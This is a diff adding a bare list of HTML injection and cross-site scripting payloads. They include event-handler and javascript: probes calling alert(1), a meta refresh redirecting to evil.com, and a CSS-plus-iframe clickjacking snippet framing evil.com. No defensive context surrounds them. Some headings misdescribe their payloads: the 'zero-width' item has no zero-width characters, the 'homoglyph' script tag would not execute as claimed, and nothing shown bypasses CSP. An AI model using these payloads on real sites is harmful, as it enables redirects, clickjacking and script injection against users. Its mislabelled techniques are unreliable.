@@ -1,0 +1,46 @@
+Invisible HTML Injection using Zero-Width Characters
+
+<span data-test="test" onclick="alert(1)">Click Here</span>
+
+
+Fake Meta Tag Injection (Reflected HTML)
+
+Hello, welcome to my page <meta http-equiv="refresh" content="0;url=https://evil.com">
+
+
+SVG-Based HTML Injection (Bypassing CSP)
+
+<svg viewBox="0 0 200 200" onload="alert(1)">
+  <text x="10" y="40">Normal Text</text>
+</svg>
+
+
+Fake Form Submission Injection
+
+<input type="hidden" name="csrf_token" value="<img src=x onerror=alert(1)>">
+
+
+UTF-8 Homoglyph Attack (Visually Normal, but Malicious)
+
+<scrіpt>alert(1)</scrіpt>
+
+
+CSS Injection for Clickjacking
+
+
+<style>
+  body { opacity: 0.1; } 
+  iframe { position: absolute; width: 100%; height: 100%; top: 0; left: 0; }
+</style>
+<iframe src="https://evil.com"></iframe>
+
+
+HTML Attribute Injection via Data URI
+
+<a href="javascript:alert(1)">Click Here</a>
+
+
+
+Email Injection in Mailto Link
+
+<a href="mailto:?subject=Hello&body=<img src=x onerror=alert(1)>">Send Email</a>
